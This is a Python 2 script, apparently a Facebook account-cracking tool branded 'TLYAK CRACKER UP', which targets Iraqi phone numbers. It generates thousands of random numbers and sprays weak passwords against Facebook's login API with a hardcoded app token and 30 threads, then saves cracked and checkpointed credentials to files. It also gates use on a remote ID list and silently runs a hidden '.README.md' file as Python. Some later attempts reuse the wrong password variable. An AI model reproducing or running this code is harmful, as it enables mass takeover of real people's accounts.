import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('')

try:
    import mechanize
except ImportError:
    os.system('')
    time.sleep(1)
    os.system('')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
os.system('rm -rf id-active.txt')
os.system('id -u > id-active.txt')
uidd = open('id-active.txt', 'r')
for j in uidd:
    sp = j.split()

manglist = requests.get('https://raw.githubusercontent.com/sherashera/sheratool/main/id.txt')
idd = manglist.text
def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo ="""
                                             

 TLYAK CRACKER UP
                                       
                                        
\033[1;94mMy Telegram : \033[1;91m@i4m_TLYAK

\033[1;94mMy Chanell  : \033[1;92m@market_pubg_kurd

\033[1;TB_LALAYAN TLYAK  
    """
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;94m[1]\x1b[1;92m KURDISTAN CRACK NUMBERS '
    print 42 * '\x1b[1;91m='
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91mSelect Option \x1b[1;93m>>>\x1b[1;95m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;92m0770, 0750, 0773, 0751,0780,0783,0781,0782'
        try:
            c = raw_input(' IRAQ CoDE  : ')
            k = ''
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '0':
        exb()
    else:
        print '[!] Fill Ba Kalk Naya'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] HaMu RaQaMakaN: ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Tkaya 10 daqa ta 30 Chawarwan Ba ...')
    time.sleep(0.1)
    psb('[!] Bo Wastandn  Toolaka CTRL+Z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACK BY SHERA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACK BY SHERA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                pass3 = '1234512345'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACK BY SHERA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass3 + '\n')
                okb.close()
                oks.append(c + user + pass3)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass3 + '\n')
                cps.close()
                cpb.append(c + user + pass3) 
            else:
                pass4 = '112233'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACK BY SHERA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass4 + '\n')
                okb.close()
                oks.append(c + user + pass4)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass4 + '\n')
                cps.close()
                cpb.append(c + user + pass4)
            else:
                pass5 = '11223344'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACK BY SHERA]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass5 + '\n')
                cps.close()
                cpb.append(c + user + pass5) 
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')
    
    
if __name__ == '__main__':
    menu()

for s in idd.split():
    print s
    if s == sp[0]:
        if __name__ == '__main__':
            menu()
else:
    os.system('clear')
    os.system('figlet ID ACTIVE')
    print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
    bani = '  \n  Bo Active Krdni Tool Akat\n\n           Massg Bka La Telegram @name\n'
    print bani
    print '       ID To >>> ' + sp[0]
    print '\x1b[90;1m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m\n\n\n'
    time.sleep(2)
    os.sys.exit()